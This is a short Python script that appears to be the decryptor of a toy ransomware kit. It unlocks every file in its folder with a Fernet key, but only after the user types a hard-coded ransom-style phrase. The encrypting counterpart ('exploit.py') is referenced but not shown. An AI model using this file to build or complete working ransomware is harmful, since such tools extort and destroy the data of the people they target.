import os
from cryptography.fernet import Fernet
from cryptography.exceptions import InvalidToken

files = []
exclude_files = ["exploit.py", "thekey.key", "decrypt.py", os.path.basename(__file__)]

for file in os.listdir():
    if file in exclude_files:
        continue
    if os.path.isfile(file):
        files.append(file)
        
print("Files found for decryption:", files)

if not os.path.exists("thekey.key"):
    print("Error: 'thekey.key' not found in this directory.")
    exit()

with open("thekey.key", "rb") as key:
    secretk = key.read().strip() 
    
phrase = "Dear R00tk1t, I have a good 0p56c!!!!"
userp = input("Enter the phrase: \n")

if userp == phrase:
    try:
        cipher = Fernet(secretk)
    except Exception as e:
        print(f"Error initializing key: {e}. Ensure 'thekey.key' is a valid Fernet key.")
        exit()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        
        try:
            contents_decrypted = cipher.decrypt(contents)
            
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            print(f" {file} - Successfully unlocked")
            
        except InvalidToken:
            print(f" Failed to decrypt {file}. (File might already be decrypted or corrupted)")
        except Exception as e:
            print(f" Unexpected error on {file}: {e}")
else:
    print("I am sorry............ :( ")